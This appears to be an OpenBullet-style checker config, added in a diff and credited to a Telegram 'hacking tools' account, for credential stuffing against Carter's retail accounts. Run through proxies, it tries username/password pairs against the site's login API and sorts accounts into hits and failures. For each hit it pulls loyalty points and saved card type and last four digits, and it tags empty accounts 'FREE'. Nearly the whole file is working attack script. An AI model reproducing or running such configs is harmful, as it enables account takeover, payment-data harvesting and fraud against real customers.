@@ -1,0 +1,132 @@
+[SETTINGS]
+{
+  "Name": "Carter's(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-30T21:57:55.2937148+01:00",
+  "AdditionalInfo": "https://t.me/wolfconfigs",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "cred" 
+
+REQUEST GET "https://www.carters.com/on/demandware.store/Sites-Carters-Site/default/FacebookCAPI-Hash" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "referer: https://www.carters.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+PARSE "<COOKIES(dwsid)>" LR "" "" -> VAR "sess" 
+
+REQUEST GET "https://web.carters.mobi/api/jwtBridge?sessionCookie=<sess>&locale=en_US" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "referer: https://web.carters.mobi/?countryCode=US&locale=en_US&languageCode=en&source=www.carters.com&sessionCookie=<sess>cobraKai=&noDefaultStore=1" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+PARSE "<SOURCE>" JSON "jwt" -> VAR "jwt" 
+
+REQUEST GET "https://web.carters.mobi/api/auth?locale=en_US&guestAuth=<jwt>" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Basic <cred>" 
+  HEADER "referer: https://web.carters.mobi/?countryCode=US&locale=en_US&languageCode=en&source=www.carters.com&sessionCookie=<sess>&cobraKai=&noDefaultStore=1" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Customer authentication based on Authorization:Basic header failed" 
+  KEYCHAIN Success OR 
+    KEY "memberSince" 
+
+PARSE "<HEADERS(Authorization)>" LR "Bearer " "" -> VAR "auth" 
+
+PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+PARSE "<SOURCE>" JSON "totalAvailablePoints" CreateEmpty=FALSE -> CAP "Points" 
+
+REQUEST GET "https://web.carters.mobi/api/fetchCart?locale=en_US&customerId=<id>" 
+  
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <auth>" 
+  HEADER "content-type: application/json" 
+  HEADER "referer: https://web.carters.mobi/my-account/settings?countryCode=US&locale=en_US&languageCode=en&source=www.carters.com&sessionCookie=<sess>&cobraKai=<auth>&noDefaultStore=1" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+PARSE "<SOURCE>" JSON "cardType" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Type" 
+
+PARSE "<SOURCE>" JSON "lastDigits" Recursive=TRUE CreateEmpty=FALSE -> CAP "Card Last 4" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Points>" EqualTo "0" 
+    KEY "paymentMethods\":[]" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
